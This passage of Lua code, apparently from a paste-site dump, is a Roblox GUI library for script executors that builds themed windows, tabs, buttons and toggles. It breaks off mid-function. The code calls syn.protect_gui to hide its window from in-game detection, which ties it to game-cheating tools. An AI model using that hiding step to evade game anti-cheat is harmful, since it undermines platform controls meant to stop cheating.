id,title,username,language,date,content
    bordercolor = Color3.fromRGB(40, 40, 40), -- Dark gray border
    accentcolor = Color3.fromRGB(255, 128, 0), -- Orange accent color (RGB 255, 128, 0)
    accentcolor2 = Color3.fromRGB(60, 60, 60), -- Dark secondary accent color
    outlinecolor = Color3.fromRGB(18, 18, 18), -- Dark background outline
    outlinecolor2 = Color3.fromRGB(30, 30, 30), -- Slightly lighter outline
    sectorcolor = Color3.fromRGB(30, 30, 30), -- Dark sector color
    toptextcolor = Color3.fromRGB(200, 200, 200), -- Light text color for top bar
    topheight = 48,
    topcolor = Color3.fromRGB(28, 28, 28), -- Dark top bar background
    topcolor2 = Color3.fromRGB(38, 38, 38), -- Slightly lighter top bar background
    buttoncolor = Color3.fromRGB(50, 50, 50), -- Dark button color
    buttoncolor2 = Color3.fromRGB(40, 40, 40), -- Slightly lighter button color
    itemscolor = Color3.fromRGB(200, 200, 200), -- Light items color
    itemscolor2 = Color3.fromRGB(25, 25, 25) -- Darker secondary items color
}

getgenv().Actyrn7104 = ""Discord: Actyrn#7104, Server: .gg/wDngb2mv4H""

if library.theme.cursor then
	local success = pcall(function()
		library.cursor = Drawing.new(""Image"")
		library.cursor.Data = game:HttpGet(library.theme.cursorimg)
		library.cursor.Size = Vector2.new(64, 64)
		library.cursor.Visible = uis.MouseEnabled
		library.cursor.Rounding = 0
		library.cursor.Position = Vector2.new(mouse.X - 32, mouse.Y + 6)
	end)

	if success and library.cursor then
		uis.InputChanged:Connect(function(input)
			if uis.MouseEnabled and input.UserInputType == Enum.UserInputType.MouseMovement then
				library.cursor.Position = Vector2.new(input.Position.X - 32, input.Position.Y + 7)
			end
		end)

		runservice.RenderStepped:Connect(function()
			uis.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.ForceHide
			library.cursor.Visible = uis.MouseEnabled and (uis.MouseIconEnabled or game:GetService(""GuiService"").MenuIsOpen)
		end)

	elseif not success and library.cursor then
		library.cursor:Remove()
	end
end

function library:CreateWindow(name, size, hidebutton)
	local window = {}
	window.name = name or """"
	window.size = UDim2.fromOffset(size.X, size.Y) or UDim2.fromOffset(500, 600)
	window.hidebutton = hidebutton or Enum.KeyCode.RightShift
	window.theme = library.theme

	local updateevent = Instance.new(""BindableEvent"")
	function window:UpdateTheme(theme)
		updateevent:Fire(theme or library.theme)
		window.theme = (theme or library.theme)
	end

	window.Main = Instance.new(""ScreenGui"", coregui)
	window.Main.Name = name
	window.Main.DisplayOrder = 15

	if syn then
		syn.protect_gui(window.Main)
	end

	local dragging, draginput2, dragstart2, startpos
	uis.InputChanged:Connect(function(input)
		if input == draginput2 and dragging then
			local delta = input.Position - dragstart2
			window.Frame.Position = UDim2.new(startpos.X.Scale, startpos.X.Offset + delta.X, startpos.Y.Scale, startpos.Y.Offset + delta.Y)
		end
	end)

	local dragstart = function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragstart2 = input.Position
			startpos = window.Frame.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end

	local dragend = function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			draginput2 = input
		end
	end

	window.Frame = Instance.new(""TextButton"", window.Main)
	window.Frame.Name = ""main""
	window.Frame.Position = UDim2.fromScale(0.5, 0.5)
	window.Frame.BorderSizePixel = 0
	window.Frame.Size = window.size
	window.Frame.AutoButtonColor = false
	window.Frame.Text = """"
	window.Frame.BackgroundColor3 = window.theme.backgroundcolor
	window.Frame.AnchorPoint = Vector2.new(0.5, 0.5)
	updateevent.Event:Connect(function(theme)
		window.Frame.BackgroundColor3 = theme.backgroundcolor
	end)

	uis.InputBegan:Connect(function(key)
		if key.KeyCode == window.hidebutton then
			window.Frame.Visible = not window.Frame.Visible
		end
	end)

	local function checkIfGuiInFront(Pos)
		local objects = coregui:GetGuiObjectsAtPosition(Pos.X, Pos.Y)
		for i, v in pairs(objects) do
			if not string.find(v:GetFullName(), window.name) then
				table.remove(objects, i)
			end
		end

		return (#objects ~= 0 and objects[1].AbsolutePosition ~= Pos)
	end

	window.BlackOutline = Instance.new(""Frame"", window.Frame)
	window.BlackOutline.Name = ""outline""
	window.BlackOutline.ZIndex = 1
	window.BlackOutline.Size = window.size + UDim2.fromOffset(2, 2)
	window.BlackOutline.BorderSizePixel = 0
	window.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
	window.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
	updateevent.Event:Connect(function(theme)
		window.BlackOutline.BackgroundColor3 = theme.outlinecolor2
	end)

	window.Outline = Instance.new(""Frame"", window.Frame)
	window.Outline.Name = ""outline""
	window.Outline.ZIndex = 0
	window.Outline.Size = window.size + UDim2.fromOffset(4, 4)
	window.Outline.BorderSizePixel = 0
	window.Outline.BackgroundColor3 = window.theme.outlinecolor
	window.Outline.Position = UDim2.fromOffset(- 2, - 2)
	updateevent.Event:Connect(function(theme)
		window.Outline.BackgroundColor3 = theme.outlinecolor
	end)

	window.BlackOutline2 = Instance.new(""Frame"", window.Frame)
	window.BlackOutline2.Name = ""outline""
	window.BlackOutline2.ZIndex = - 1
	window.BlackOutline2.Size = window.size + UDim2.fromOffset(6, 6)
	window.BlackOutline2.BorderSizePixel = 0
	window.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
	window.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
	updateevent.Event:Connect(function(theme)
		window.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
	end)

	window.TopBar = Instance.new(""Frame"", window.Frame)
	window.TopBar.Name = ""top""
	window.TopBar.Size = UDim2.fromOffset(window.size.X.Offset, window.theme.topheight)
	window.TopBar.BorderSizePixel = 0
	window.TopBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	window.TopBar.InputBegan:Connect(dragstart)
	window.TopBar.InputChanged:Connect(dragend)
	updateevent.Event:Connect(function(theme)
		window.TopBar.Size = UDim2.fromOffset(window.size.X.Offset, theme.topheight)
	end)

	window.TopGradient = Instance.new(""UIGradient"", window.TopBar)
	window.TopGradient.Rotation = 90
	window.TopGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, window.theme.topcolor), ColorSequenceKeypoint.new(1, window.theme.topcolor2)})
	updateevent.Event:Connect(function(theme)
		window.TopGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, theme.topcolor), ColorSequenceKeypoint.new(1, theme.topcolor2)})
	end)

	window.NameLabel = Instance.new(""TextLabel"", window.TopBar)
	window.NameLabel.TextColor3 = window.theme.toptextcolor
	window.NameLabel.Text = window.name
	window.NameLabel.TextXAlignment = Enum.TextXAlignment.Left
	window.NameLabel.Font = window.theme.font
	window.NameLabel.Name = ""title""
	window.NameLabel.Position = UDim2.fromOffset(4, - 2)
	window.NameLabel.BackgroundTransparency = 1
	window.NameLabel.Size = UDim2.fromOffset(190, window.TopBar.AbsoluteSize.Y / 2 - 2)
	window.NameLabel.TextSize = window.theme.titlesize
	updateevent.Event:Connect(function(theme)
		window.NameLabel.TextColor3 = theme.toptextcolor
		window.NameLabel.Font = theme.font
		window.NameLabel.TextSize = theme.titlesize
	end)

	window.Line2 = Instance.new(""Frame"", window.TopBar)
	window.Line2.Name = ""line""
	window.Line2.Position = UDim2.fromOffset(0, window.TopBar.AbsoluteSize.Y / 2.1)
	window.Line2.Size = UDim2.fromOffset(window.size.X.Offset, 1)
	window.Line2.BorderSizePixel = 0
	window.Line2.BackgroundColor3 = window.theme.accentcolor
	updateevent.Event:Connect(function(theme)
		window.Line2.BackgroundColor3 = theme.accentcolor
	end)

	window.TabList = Instance.new(""Frame"", window.TopBar)
	window.TabList.Name = ""tablist""
	window.TabList.BackgroundTransparency = 1
	window.TabList.Position = UDim2.fromOffset(0, window.TopBar.AbsoluteSize.Y / 2 + 1)
	window.TabList.Size = UDim2.fromOffset(window.size.X.Offset, window.TopBar.AbsoluteSize.Y / 2)
	window.TabList.BorderSizePixel = 0
	window.TabList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

	window.TabList.InputBegan:Connect(dragstart)
	window.TabList.InputChanged:Connect(dragend)

	window.BlackLine = Instance.new(""Frame"", window.Frame)
	window.BlackLine.Name = ""blackline""
	window.BlackLine.Size = UDim2.fromOffset(window.size.X.Offset, 1)
	window.BlackLine.BorderSizePixel = 0
	window.BlackLine.ZIndex = 9
	window.BlackLine.BackgroundColor3 = window.theme.outlinecolor2
	window.BlackLine.Position = UDim2.fromOffset(0, window.TopBar.AbsoluteSize.Y)
	updateevent.Event:Connect(function(theme)
		window.BlackLine.BackgroundColor3 = theme.outlinecolor2
	end)

	window.BackgroundImage = Instance.new(""ImageLabel"", window.Frame)
	window.BackgroundImage.Name = ""background""
	window.BackgroundImage.BorderSizePixel = 0
	window.BackgroundImage.ScaleType = Enum.ScaleType.Tile
	window.BackgroundImage.Position = window.BlackLine.Position + UDim2.fromOffset(0, 1)
	window.BackgroundImage.Size = UDim2.fromOffset(window.size.X.Offset, window.size.Y.Offset - window.TopBar.AbsoluteSize.Y - 1)
	window.BackgroundImage.Image = window.theme.background or """"
	window.BackgroundImage.ImageTransparency = window.BackgroundImage.Image ~= """" and 0 or 1
	window.BackgroundImage.ImageColor3 = Color3.new()
	window.BackgroundImage.BackgroundColor3 = window.theme.backgroundcolor
	window.BackgroundImage.TileSize = UDim2.new(0, window.theme.tilesize, 0, window.theme.tilesize)
	updateevent.Event:Connect(function(theme)
		window.BackgroundImage.Image = theme.background or """"
		window.BackgroundImage.ImageTransparency = window.BackgroundImage.Image ~= """" and 0 or 1
		window.BackgroundImage.BackgroundColor3 = theme.backgroundcolor
		window.BackgroundImage.TileSize = UDim2.new(0, theme.tilesize, 0, theme.tilesize)
	end)

	window.Line = Instance.new(""Frame"", window.Frame)
	window.Line.Name = ""line""
	window.Line.Position = UDim2.fromOffset(0, 0)
	window.Line.Size = UDim2.fromOffset(60, 1)
	window.Line.BorderSizePixel = 0
	window.Line.BackgroundColor3 = window.theme.accentcolor
	updateevent.Event:Connect(function(theme)
		window.Line.BackgroundColor3 = theme.accentcolor
	end)

	window.ListLayout = Instance.new(""UIListLayout"", window.TabList)
	window.ListLayout.FillDirection = Enum.FillDirection.Horizontal
	window.ListLayout.SortOrder = Enum.SortOrder.LayoutOrder

	window.OpenedColorPickers = {}
	window.Tabs = {}

	function window:CreateTab(name)
		local tab = {}
		tab.name = name or """"

		local size = textservice:GetTextSize(tab.name, window.theme.fontsize, window.theme.font, Vector2.new(200, 300))

		tab.TabButton = Instance.new(""TextButton"", window.TabList)
		tab.TabButton.TextColor3 = window.theme.tabstextcolor
		tab.TabButton.Text = tab.name
		tab.TabButton.AutoButtonColor = false
		tab.TabButton.Font = window.theme.font
		tab.TabButton.TextYAlignment = Enum.TextYAlignment.Center
		tab.TabButton.BackgroundTransparency = 1
		tab.TabButton.BorderSizePixel = 0
		tab.TabButton.Size = UDim2.fromOffset(size.X + 15, window.TabList.AbsoluteSize.Y - 1)
		tab.TabButton.Name = tab.name
		tab.TabButton.TextSize = window.theme.fontsize
		updateevent.Event:Connect(function(theme)
			local size = textservice:GetTextSize(tab.name, theme.fontsize, theme.font, Vector2.new(200, 300))
			tab.TabButton.TextColor3 = tab.TabButton.Name == ""SelectedTab"" and theme.accentcolor or theme.tabstextcolor
			tab.TabButton.Font = theme.font
			tab.TabButton.Size = UDim2.fromOffset(size.X + 15, window.TabList.AbsoluteSize.Y - 1)
			tab.TabButton.TextSize = theme.fontsize
		end)

		tab.Left = Instance.new(""ScrollingFrame"", window.Frame)
		tab.Left.Name = ""leftside""
		tab.Left.BorderSizePixel = 0
		tab.Left.Size = UDim2.fromOffset(window.size.X.Offset / 2, window.size.Y.Offset - (window.TopBar.AbsoluteSize.Y + 1))
		tab.Left.BackgroundTransparency = 1
		tab.Left.Visible = false
		tab.Left.ScrollBarThickness = 0
		tab.Left.ScrollingDirection = ""Y""
		tab.Left.Position = window.BlackLine.Position + UDim2.fromOffset(0, 1)

		tab.LeftListLayout = Instance.new(""UIListLayout"", tab.Left)
		tab.LeftListLayout.FillDirection = Enum.FillDirection.Vertical
		tab.LeftListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		tab.LeftListLayout.Padding = UDim.new(0, 12)

		tab.LeftListPadding = Instance.new(""UIPadding"", tab.Left)
		tab.LeftListPadding.PaddingTop = UDim.new(0, 12)
		tab.LeftListPadding.PaddingLeft = UDim.new(0, 12)
		tab.LeftListPadding.PaddingRight = UDim.new(0, 12)

		tab.Right = Instance.new(""ScrollingFrame"", window.Frame)
		tab.Right.Name = ""rightside""
		tab.Right.ScrollBarThickness = 0
		tab.Right.ScrollingDirection = ""Y""
		tab.Right.Visible = false
		tab.Right.BorderSizePixel = 0
		tab.Right.Size = UDim2.fromOffset(window.size.X.Offset / 2, window.size.Y.Offset - (window.TopBar.AbsoluteSize.Y + 1))
		tab.Right.BackgroundTransparency = 1
		tab.Right.Position = tab.Left.Position + UDim2.fromOffset(tab.Left.AbsoluteSize.X, 0)

		tab.RightListLayout = Instance.new(""UIListLayout"", tab.Right)
		tab.RightListLayout.FillDirection = Enum.FillDirection.Vertical
		tab.RightListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		tab.RightListLayout.Padding = UDim.new(0, 12)

		tab.RightListPadding = Instance.new(""UIPadding"", tab.Right)
		tab.RightListPadding.PaddingTop = UDim.new(0, 12)
		tab.RightListPadding.PaddingLeft = UDim.new(0, 6)
		tab.RightListPadding.PaddingRight = UDim.new(0, 12)

		local block = false
		function tab:SelectTab()
			repeat wait() until not block

			block = true
			for i, v in pairs(window.Tabs) do
				if v ~= tab then
					v.TabButton.TextColor3 = Color3.fromRGB(230, 230, 230)
					v.TabButton.Name = ""Tab""
					v.Left.Visible = false
					v.Right.Visible = false
				end
			end

			tab.TabButton.TextColor3 = window.theme.accentcolor
			tab.TabButton.Name = ""SelectedTab""
			tab.Right.Visible = true
			tab.Left.Visible = true
			window.Line:TweenSizeAndPosition(UDim2.fromOffset(size.X + 15, 1), UDim2.new(0, (tab.TabButton.AbsolutePosition.X - window.Frame.AbsolutePosition.X), 0, 0) + (window.BlackLine.Position - UDim2.fromOffset(0, 1)), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.15)
			wait(0.2)
			block = false
		end

		if #window.Tabs == 0 then
			tab:SelectTab()
		end

		tab.TabButton.MouseButton1Down:Connect(function()
			tab:SelectTab()
		end)

		tab.SectorsLeft = {}
		tab.SectorsRight = {}

		function tab:CreateSector(name, side)
			local sector = {}
			sector.name = name or """"
			sector.side = side:lower() or ""left""

			sector.Main = Instance.new(""Frame"", sector.side == ""left"" and tab.Left or tab.Right)
			sector.Main.Name = sector.name:gsub("" "", """") .. ""Sector""
			sector.Main.BorderSizePixel = 0
			sector.Main.ZIndex = 4
			sector.Main.Size = UDim2.fromOffset(window.size.X.Offset / 2 - 17, 20)
			sector.Main.BackgroundColor3 = window.theme.sectorcolor
			updateevent.Event:Connect(function(theme)
				sector.Main.BackgroundColor3 = theme.sectorcolor
			end)

			sector.Line = Instance.new(""Frame"", sector.Main)
			sector.Line.Name = ""line""
			sector.Line.ZIndex = 4
			sector.Line.Size = UDim2.fromOffset(sector.Main.Size.X.Offset + 4, 1)
			sector.Line.BorderSizePixel = 0
			sector.Line.Position = UDim2.fromOffset(- 2, - 2)
			sector.Line.BackgroundColor3 = window.theme.accentcolor
			updateevent.Event:Connect(function(theme)
				sector.Line.BackgroundColor3 = theme.accentcolor
			end)

			sector.BlackOutline = Instance.new(""Frame"", sector.Main)
			sector.BlackOutline.Name = ""outline""
			sector.BlackOutline.ZIndex = 3
			sector.BlackOutline.Size = sector.Main.Size + UDim2.fromOffset(2, 2)
			sector.BlackOutline.BorderSizePixel = 0
			sector.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
			sector.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
			sector.Main:GetPropertyChangedSignal(""Size""):Connect(function()
				sector.BlackOutline.Size = sector.Main.Size + UDim2.fromOffset(2, 2)
			end)
			updateevent.Event:Connect(function(theme)
				sector.BlackOutline.BackgroundColor3 = theme.outlinecolor2
			end)


			sector.Outline = Instance.new(""Frame"", sector.Main)
			sector.Outline.Name = ""outline""
			sector.Outline.ZIndex = 2
			sector.Outline.Size = sector.Main.Size + UDim2.fromOffset(4, 4)
			sector.Outline.BorderSizePixel = 0
			sector.Outline.BackgroundColor3 = window.theme.outlinecolor
			sector.Outline.Position = UDim2.fromOffset(- 2, - 2)
			sector.Main:GetPropertyChangedSignal(""Size""):Connect(function()
				sector.Outline.Size = sector.Main.Size + UDim2.fromOffset(4, 4)
			end)
			updateevent.Event:Connect(function(theme)
				sector.Outline.BackgroundColor3 = theme.outlinecolor
			end)

			sector.BlackOutline2 = Instance.new(""Frame"", sector.Main)
			sector.BlackOutline2.Name = ""outline""
			sector.BlackOutline2.ZIndex = 1
			sector.BlackOutline2.Size = sector.Main.Size + UDim2.fromOffset(6, 6)
			sector.BlackOutline2.BorderSizePixel = 0
			sector.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
			sector.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
			sector.Main:GetPropertyChangedSignal(""Size""):Connect(function()
				sector.BlackOutline2.Size = sector.Main.Size + UDim2.fromOffset(6, 6)
			end)
			updateevent.Event:Connect(function(theme)
				sector.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
			end)

			local size = textservice:GetTextSize(sector.name, 15, window.theme.font, Vector2.new(2000, 2000))
			sector.Label = Instance.new(""TextLabel"", sector.Main)
			sector.Label.AnchorPoint = Vector2.new(0, 0.5)
			sector.Label.Position = UDim2.fromOffset(12, - 1)
			sector.Label.Size = UDim2.fromOffset(math.clamp(textservice:GetTextSize(sector.name, 15, window.theme.font, Vector2.new(200, 300)).X + 13, 0, sector.Main.Size.X.Offset), size.Y)
			sector.Label.BackgroundTransparency = 1
			sector.Label.BorderSizePixel = 0
			sector.Label.ZIndex = 6
			sector.Label.Text = sector.name
			sector.Label.TextColor3 = Color3.new(1, 1, 2552 / 255)
			sector.Label.TextStrokeTransparency = 1
			sector.Label.Font = window.theme.font
			sector.Label.TextSize = 15
			updateevent.Event:Connect(function(theme)
				local size = textservice:GetTextSize(sector.name, 15, theme.font, Vector2.new(2000, 2000))
				sector.Label.Size = UDim2.fromOffset(math.clamp(textservice:GetTextSize(sector.name, 15, theme.font, Vector2.new(200, 300)).X + 13, 0, sector.Main.Size.X.Offset), size.Y)
				sector.Label.Font = theme.font
			end)

			sector.LabelBackFrame = Instance.new(""Frame"", sector.Main)
			sector.LabelBackFrame.Name = ""labelframe""
			sector.LabelBackFrame.ZIndex = 5
			sector.LabelBackFrame.Size = UDim2.fromOffset(sector.Label.Size.X.Offset, 10)
			sector.LabelBackFrame.BorderSizePixel = 0
			sector.LabelBackFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			sector.LabelBackFrame.Position = UDim2.fromOffset(sector.Label.Position.X.Offset, sector.BlackOutline2.Position.Y.Offset)

			sector.Items = Instance.new(""Frame"", sector.Main)
			sector.Items.Name = ""items""
			sector.Items.ZIndex = 2
			sector.Items.BackgroundTransparency = 1
			sector.Items.Size = UDim2.fromOffset(170, 140)
			sector.Items.AutomaticSize = Enum.AutomaticSize.Y
			sector.Items.BorderSizePixel = 0

			sector.ListLayout = Instance.new(""UIListLayout"", sector.Items)
			sector.ListLayout.FillDirection = Enum.FillDirection.Vertical
			sector.ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			sector.ListLayout.Padding = UDim.new(0, 12)

			sector.ListPadding = Instance.new(""UIPadding"", sector.Items)
			sector.ListPadding.PaddingTop = UDim.new(0, 15)
			sector.ListPadding.PaddingLeft = UDim.new(0, 6)
			sector.ListPadding.PaddingRight = UDim.new(0, 6)

			table.insert(sector.side:lower() == ""left"" and tab.SectorsLeft or tab.SectorsRight, sector)

			function sector:FixSize()
				sector.Main.Size = UDim2.fromOffset(window.size.X.Offset / 2 - 17, sector.ListLayout.AbsoluteContentSize.Y + 22)
				local sizeleft, sizeright = 0, 0
				for i, v in pairs(tab.SectorsLeft) do
					sizeleft = sizeleft + v.Main.AbsoluteSize.Y
				end
				for i, v in pairs(tab.SectorsRight) do
					sizeright = sizeright + v.Main.AbsoluteSize.Y
				end

				tab.Left.CanvasSize = UDim2.fromOffset(tab.Left.AbsoluteSize.X, sizeleft + ((#tab.SectorsLeft - 1) * tab.LeftListPadding.PaddingTop.Offset) + 20)
				tab.Right.CanvasSize = UDim2.fromOffset(tab.Right.AbsoluteSize.X, sizeright + ((#tab.SectorsRight - 1) * tab.RightListPadding.PaddingTop.Offset) + 20)
			end

			function sector:AddButton(text, callback)
				local button = {}
				button.text = text or """"
				button.callback = callback or function() end

				button.Main = Instance.new(""TextButton"", sector.Items)
				button.Main.BorderSizePixel = 0
				button.Main.Text = """"
				button.Main.AutoButtonColor = false
				button.Main.Name = ""button""
				button.Main.ZIndex = 5
				button.Main.Size = UDim2.fromOffset(sector.Main.Size.X.Offset - 12, 14)
				button.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

				button.Gradient = Instance.new(""UIGradient"", button.Main)
				button.Gradient.Rotation = 90
				button.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, window.theme.buttoncolor), ColorSequenceKeypoint.new(1, window.theme.buttoncolor2)})
				updateevent.Event:Connect(function(theme)
					button.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, theme.buttoncolor), ColorSequenceKeypoint.new(1, theme.buttoncolor2)})
				end)

				button.BlackOutline2 = Instance.new(""Frame"", button.Main)
				button.BlackOutline2.Name = ""blackline""
				button.BlackOutline2.ZIndex = 4
				button.BlackOutline2.Size = button.Main.Size + UDim2.fromOffset(6, 6)
				button.BlackOutline2.BorderSizePixel = 0
				button.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				button.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
				updateevent.Event:Connect(function(theme)
					button.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
				end)

				button.Outline = Instance.new(""Frame"", button.Main)
				button.Outline.Name = ""blackline""
				button.Outline.ZIndex = 4
				button.Outline.Size = button.Main.Size + UDim2.fromOffset(4, 4)
				button.Outline.BorderSizePixel = 0
				button.Outline.BackgroundColor3 = window.theme.outlinecolor
				button.Outline.Position = UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					button.Outline.BackgroundColor3 = theme.outlinecolor
				end)

				button.BlackOutline = Instance.new(""Frame"", button.Main)
				button.BlackOutline.Name = ""blackline""
				button.BlackOutline.ZIndex = 4
				button.BlackOutline.Size = button.Main.Size + UDim2.fromOffset(2, 2)
				button.BlackOutline.BorderSizePixel = 0
				button.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
				button.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
				updateevent.Event:Connect(function(theme)
					button.BlackOutline.BackgroundColor3 = theme.outlinecolor2
				end)

				button.Label = Instance.new(""TextLabel"", button.Main)
				button.Label.Name = ""Label""
				button.Label.BackgroundTransparency = 1
				button.Label.Position = UDim2.new(0, - 1, 0, 0)
				button.Label.ZIndex = 5
				button.Label.Size = button.Main.Size
				button.Label.Font = window.theme.font
				button.Label.Text = button.text
				button.Label.TextColor3 = window.theme.itemscolor2
				button.Label.TextSize = 15
				button.Label.TextStrokeTransparency = 1
				button.Label.TextXAlignment = Enum.TextXAlignment.Center
				button.Main.MouseButton1Down:Connect(button.callback)
				updateevent.Event:Connect(function(theme)
					button.Label.Font = theme.font
					button.Label.TextColor3 = theme.itemscolor
				end)

				button.BlackOutline2.MouseEnter:Connect(function()
					button.BlackOutline2.BackgroundColor3 = window.theme.accentcolor
				end)

				button.BlackOutline2.MouseLeave:Connect(function()
					button.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				end)

				sector:FixSize()

				return button
			end

			function sector:AddLabel(text)
				local label = {}

				label.Main = Instance.new(""TextLabel"", sector.Items)
				label.Main.Name = ""Label""
				label.Main.BackgroundTransparency = 1
				label.Main.Position = UDim2.new(0, - 1, 0, 0)
				label.Main.ZIndex = 4
				label.Main.AutomaticSize = Enum.AutomaticSize.XY
				label.Main.Font = window.theme.font
				label.Main.Text = text
				label.Main.TextColor3 = window.theme.itemscolor
				label.Main.TextSize = 15
				label.Main.TextStrokeTransparency = 1
				label.Main.TextXAlignment = Enum.TextXAlignment.Left
				updateevent.Event:Connect(function(theme)
					label.Main.Font = theme.font
					label.Main.TextColor3 = theme.itemscolor
				end)

				function label:Set(value)
					label.Main.Text = value
				end

				sector:FixSize()

				return label
			end

			function sector:AddToggle(text, default, callback, flag)
				local toggle = {}
				toggle.text = text or """"
				toggle.default = default or false
				toggle.callback = callback or function(value) end
				toggle.flag = flag or text or """"

				toggle.value = toggle.default

				toggle.Main = Instance.new(""TextButton"", sector.Items)
				toggle.Main.Name = ""toggle""
				toggle.Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				toggle.Main.BorderColor3 = window.theme.outlinecolor
				toggle.Main.BorderSizePixel = 0
				toggle.Main.Size = UDim2.fromOffset(8, 8)
				toggle.Main.AutoButtonColor = false
				toggle.Main.ZIndex = 5
				toggle.Main.Font = Enum.Font.SourceSans
				toggle.Main.Text = """"
				toggle.Main.TextColor3 = Color3.fromRGB(0, 0, 0)
				toggle.Main.TextSize = 15
				updateevent.Event:Connect(function(theme)
					toggle.Main.BorderColor3 = theme.outlinecolor
				end)

				toggle.BlackOutline2 = Instance.new(""Frame"", toggle.Main)
				toggle.BlackOutline2.Name = ""blackline""
				toggle.BlackOutline2.ZIndex = 4
				toggle.BlackOutline2.Size = toggle.Main.Size + UDim2.fromOffset(6, 6)
				toggle.BlackOutline2.BorderSizePixel = 0
				toggle.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
				toggle.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
				updateevent.Event:Connect(function(theme)
					toggle.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
				end)

				toggle.Outline = Instance.new(""Frame"", toggle.Main)
				toggle.Outline.Name = ""blackline""
				toggle.Outline.ZIndex = 4
				toggle.Outline.Size = toggle.Main.Size + UDim2.fromOffset(4, 4)
				toggle.Outline.BorderSizePixel = 0
				toggle.Outline.BackgroundColor3 = window.theme.outlinecolor
				toggle.Outline.Position = UDim2.fromOffset(- 2, - 2)
				updateevent.Event:Connect(function(theme)
					toggle.Outline.BackgroundColor3 = theme.outlinecolor
				end)

				toggle.BlackOutline = Instance.new(""Frame"", toggle.Main)
				toggle.BlackOutline.Name = ""blackline""
				toggle.BlackOutline.ZIndex = 4
				toggle.BlackOutline.Size = toggle.Main.Size + UDim2.fromOffset(2, 2)
				toggle.BlackOutline.BorderSizePixel = 0
				toggle.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
				toggle.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
				updateevent.Event:Connect(function(theme)
					toggle.BlackOutline.BackgroundColor3 = theme.outlinecolor2
				end)

				toggle.Gradient = Instance.new(""UIGradient"", toggle.Main)
				toggle.Gradient.Rotation = (22.5 * 13)
				toggle.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 30)), ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 45, 45))})

				toggle.Label = Instance.new(""TextButton"", toggle.Main)
